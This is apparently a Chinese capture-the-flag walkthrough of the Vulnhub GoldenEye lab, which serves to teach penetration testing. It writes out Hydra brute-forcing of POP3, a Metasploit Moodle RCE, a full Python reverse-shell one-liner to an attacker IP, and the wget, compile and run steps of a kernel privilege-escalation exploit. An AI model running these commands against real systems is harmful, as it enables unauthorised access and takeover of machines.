## Vulnhub百个项目渗透

[靶场自取 提取码：rong ](https://pan.baidu.com/s/1xHN-MmM0_3fS7R0-gNEPuA?pwd=rong)  
Vulnhub百个项目渗透——项目一：GoldenEye（密码爆破，图片逆向分析，内核提权）

* * *

作者水平很有限，如果发现错误，还望告知，感谢！

* * *

## 前言

本文章仅用作实验学习，实验环境均为自行搭建的公开vuinhub靶场，仅使用kali虚拟机作为操作学习工具。本文仅用作学习记录，不做任何导向。请勿在现实环境中模仿，操作。

* * *

## 一、梳理流程

  1. 端口发现（看看使用了哪些端口，开启了什么服务，寻找突破点）

  2. 信息收集（利用遍历，关键词搜索等方式对敏感文件，插件尝试访问，寻求突破并获取shell）

  3. 获取shell（利用版本漏洞或者中间件等拿到shell）

  4. 二次收集（基于已得到的服务或者主机再次信息收集）

  5. 内网提权（尝试利用内核，各种版本漏洞等方式来提升权限）

  6. 毁尸灭迹（清除日志等文件，但是靶场就没必要了，拿旗就走）

## 二、使用步骤

### 1.端口发现

> 代码如下：
    
    
    ifconfig                  //用来查看自己的IP
    namp 192.168.247.0/24 -sP //用来扫描同网段所有存活主机，注意最后是0
    这个IP是你ifconfig出来的IP
    nmap -p- 192.168.247.134  //扫描开放端口，找服务
    （服务越多，我们越应该兴奋，因为服务多代表漏洞越多，越好下手）
    

![在这里插入图片描述](https://image.3001.net/images/20221220/1671515573_63a14db5992da27bde569.png!small)

> 开放了25和80端口还有两个55006和55007按照靶场的尿性估计有的搞，按照惯例，我们先去80看看

### 2.web突破

![!\[在这里插入图片描述\]\(https://img-blog.csdnimg.cn/b53127d164f5467a8b4c2a37404da8c1.png](https://image.3001.net/images/20221220/1671515574_63a14db6edf5d4ac27461.png!small)让我们去这个目录下登录

![在这里插入图片描述](https://image.3001.net/images/20221220/1671515575_63a14db7afdd695eebf6a.png!small)一看就是一个js页面，既然是前端，就右键看一下源码  
![在这里插入图片描述](https://image.3001.net/images/20221220/1671515576_63a14db871a6cb3280a12.png!small)看到一个js文件，去看看这个js是什么牛马  
![在这里插入图片描述](https://image.3001.net/images/20221220/1671515577_63a14db93512e06d73184.png!small)

> 有这么一段牛马话，翻译一下大致意思boris，记得更新你的默认密码，这就是爆破的可能性  
> 账户：boris,密码：InvincibleHack3r（翻译过来居然是无敌黑客3r，真自恋），还有一个账户：Natalya  
> 到这就去登陆一下

登录之后是一个页面（这个就没截图，属实没必要），全局翻译一下  
告诉我们：  
![在这里插入图片描述](https://image.3001.net/images/20221220/1671515578_63a14dba27f22cf055934.png!small)也就是说有一个高的开放端口负责pop3的业务，pop3是简单的邮局协议，所以安全性很低，这个时候就应该想起之前namp扫到的55006那个端口。

> 进一步扫描服务
    
    
    nmap -sS -sV -T5 -A -p55006,55007 192.168.195.42 
    每个参数都有它的意义，可以在搜一下。我会单写一篇工具使用的文章的
    

![在这里插入图片描述](https://image.3001.net/images/20221220/1671515579_63a14dbb116cb92cc6011.png!small)没有啥无密码登陆的东西，那就访问一下55007端口的pop3服务  
![在这里插入图片描述](https://image.3001.net/images/20221220/1671515580_63a14dbc5375dcd105f51.png!small)

### 密码爆破

访问不了，有可能是没登陆还是什么的，之前翻译那一段牛马话的时候知道了最起码boris用的是默认密码，所以就爆破，这里选择九头蛇（Hydra）工具

    
    
    echo -e 'natalya\nboris' > rong.txt   ---将两个用户名写入txt文本中
    hydra -L rong.txt -P /usr/share/wordlists/fasttrack.txt 192.168.4.202 -s 55007 pop3
    --上面这条命令是九头蛇自带的密码，小伙伴们自己寻找一些字典就好，
    不过实际生活成功率一般
    

> 经过2~5分钟等待，获得两组账号密码：  
> [55007][pop3] host: 192.168.4.202 login: natalya password: bird  
> [55007][pop3] host: 192.168.4.202 login: boris password: secret1!  
> 用户：boris 密码：secret1!  
> 用户：natalya 密码：bird

有了账号密码就登陆呗，利用nc登陆即可，方便快捷

    
    
    通过NC登录pop3查看邮件信封内容枚举：
    nc 192.168.4.202 55007     ---登录邮箱
    user boris                 ---登录用户
    pass secret1!              ---登录密码
    list                       ---查看邮件数量
    retr 1~3                   ---查看邮件内容
    

![在这里插入图片描述](https://image.3001.net/images/20221220/1671515581_63a14dbd2489ce3414587.png!small)

> 其中一封邮件翻译过来是这个样

然后就没啥东西了，再登录natalya的账户看看

    
    
    nc 192.168.4.202 55007     ---登录邮箱
    user natalya               ---登录用户
    pass bird                  ---登录密码
    list                       ---查看邮件数量
    retr 1~3                   ---查看邮件内容
    

![在这里插入图片描述](https://image.3001.net/images/20221220/1671515582_63a14dbe3f92e735d2314.png!small)

> 又知道了一组账号密码，并且要求我们做本地host，并且给了一个目录，我们做完host就去访问登录
    
    
    gedit /etc/hosts     -----打开hosts文件
    192.168.4.202 severnaya-station.com    --添加进去
    

登录之后源码啥的都没问题，我们到处点点，看看有啥残留的信息，邮件，或者是啥的，然后找到了：  
Home / ▶ My profile / ▶ Messages --->发现有一封邮件，内容翻译发现用户名doak

> 再爆破doak的账户
    
    
    echo doak > rong2.txt   ---将用户名写入txt文本中
    hydra -L rong2 -P /usr/share/wordlists/fasttrack.txt 192.168.4.202 -s 55007 pop3 
    
    [55007][pop3] host: 192.168.4.202   login: doak   password: goat
    获得用户名密码：doak/goat
    
    登录doak用户枚举邮件信息
    nc 192.168.4.202 55007     ---登录邮箱
    user doak                  ---登录用户
    pass goat                  ---登录密码
    list                       ---查看邮件数量
    retr 1                     ---查看邮件内容
    

> 邮件消息说，为我们提供了更多登录凭据以登录到应用程序。让我们尝试使用这些凭据登录。  
> 用户名：dr_doak  
> 密码：4England!

> 使用新的账户密码登录CMS  
> 登录后在：Home / ▶ My home 右边发现： s3cret.txt  
> 另外发现这是Moodle使用的2.2.3版本(可以搜索一下版本漏洞)一会搜  
> 先访问一下已知文件

![在这里插入图片描述](https://image.3001.net/images/20221220/1671515583_63a14dbfb4173f5d9c79b.png!small)

### 2.图片逆向分析

    
    
    wget http://severnaya-station.com/dir007key/for-007.jpg
    把图片下载到本地
    

一张图片，啥都没有，但是又是专门搞得，就尝试一下图片的逆向分析

    
    
    binwalk（路由逆向分析工具）
    exiftool（图虫）
    strings（识别动态库版本指令）
    等查看jpg文件底层内容！
    
    exiftool for-007.jpg    --这个好用
    strings for-007.jpg
    用以上命令都可以查看到base64编码隐藏信息：eFdpbnRlcjE5OTV4IQ==
    base64解码得到：xWinter1995x!
    根据之前的邮件我们知道这是一个admin的密码
    （翻译软件的话我建议还是别用谷歌，用deepl，非常准确翻译出来）
    
    

> 所以尝试登陆  
> 用户名：admin  
> 密码：xWinter1995x!  
> severnaya-station.com/gnocertdir  
> 找了半天也没啥太大的突破，那就只能找找有没有版本漏洞（上面我们在那个docker的账户里面找到了版本号），或者内核漏洞

### 3.版本漏洞拿到shell

    
    
    15、此版本有许多漏洞利用，选一个RCE来用就好
    使用MSF
    框架利用很方便
    
    msfconsole                      ---进入MSF框架攻击界面
    search moodle                   ---查找 moodle类型 攻击的模块
    use 0                           ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本
    set username admin              ---设置用户名：admin
    set password xWinter1995x!      ---设置密码：xWinter1995x!
    set rhost severnaya-station.com ---设置：rhosts severnaya-station.com
    set targeturi /gnocertdir       ---设置目录： /gnocertdir
    set payload cmd/unix/reverse    ---设置payload：cmd/unix/reverse
    set lhost 192.168.4.231           
    ---设置：lhost 192.168.4.231（自己的IP）
    exploit  ----执行命令
    
    
    当我们执行后发现无法成功，是因为对方需要修改执行PSpellShell
    我是谷歌搜的，多翻一翻就能看懂了宝，url给到这里
    https://www.exploit-db.com/exploits/29324
    's_editor_tinymce_spellengine' => 'PSpellShell',
    有这么一句话所以知道要更改shell类型
    
    然后我百度了一下这个版本的moodle怎么修改shell类型
    
    Home / ▶ Site administration / ▶ Plugins / ▶ Text editors / ▶ TinyMCE HTML editor
    来到此处，修改PSpellShell然后save！
    
    然后msf重新run一下，就拿到了shell
    但是这个时候 我们的shell在msf里，非常不好用
    接下来讲的非常重要，死死备注
    1. 新开终端端口，开启监听
    nc -vlp 6666
    
    2. 执行tty，因为获得的权限无框架：执行
    python -c 'import pty; pty.spawn("/bin/bash")'     
    ---将shell进行tty
    
    3. python反弹shell
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.28",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    
    利用python调用socket来达到监听的目的，万金油，就这么用，保存好，
    以后直接用，还有很多协议的，没装python就用别的，总是有的用的，
    我后面总结一个出来
    嘎嘎好用
    

### 3.内核提权

    
    
    内核提权
    uname -a 查看权限
    
    Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
    
    谷歌搜索：Linux ubuntu 3.13.0-32 exploit   --就这么搜，嘎嘎准
    获得exp版本：37292
    
    
    kali搜索：
    searchsploit 37292     ---搜索kali本地的exp库中37292攻击脚本信息
    所以没事就更新一下你的kali，就越来越好用
    cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/  
     ---目录自行修改
    
    按照一般思路需要gcc编译成一个可执行文件，然后执行就能提权成功
    但是在实际测试环境中，发现并没有gcc的环境，我们就用cc编译也一样
    
    gedit 37292.c       ---文本打开 
    第143行将gcc改为cc    ---编写下 
    
    然后在kali开启http服务：
    python -m SimpleHTTPServer 8081
    ---新版的python把这个命令改了，如果你是新版的python，就执行下面这个
    python -m http.server 8081//python3改版了注意
    
    wget http://192.168.4.222:8081/37292.c   ---wget下载http服务下的文件---这是在靶机的shell上执行的命令，不是
    
    成功下载后执行cc编译：
    cc -o exp 37292.c     ---C语言的CC代码编译点c文件
    chmod +x exp          ---编译成可执行文件，并赋权（+x是最高权）
    ./exp                 ---点杠执行
    
    id                   ---查看目前权限
    ls                  
    ---看一下root目录下有没有flag，一般最后一个flag直接就在root下
    cat /root/.flag.txt  ---读取root下的flag信息
    568628e0d993b1973adc718237da6e93
    
    

# 三.总结

1.密码爆破(九头蛇)  
2.图片逆向分析(binwalk（路由逆向分析工具）  
exiftool（图虫）  
strings（识别动态库版本指令）)  
3.内核提权（没有gcc的环境的替代方法）

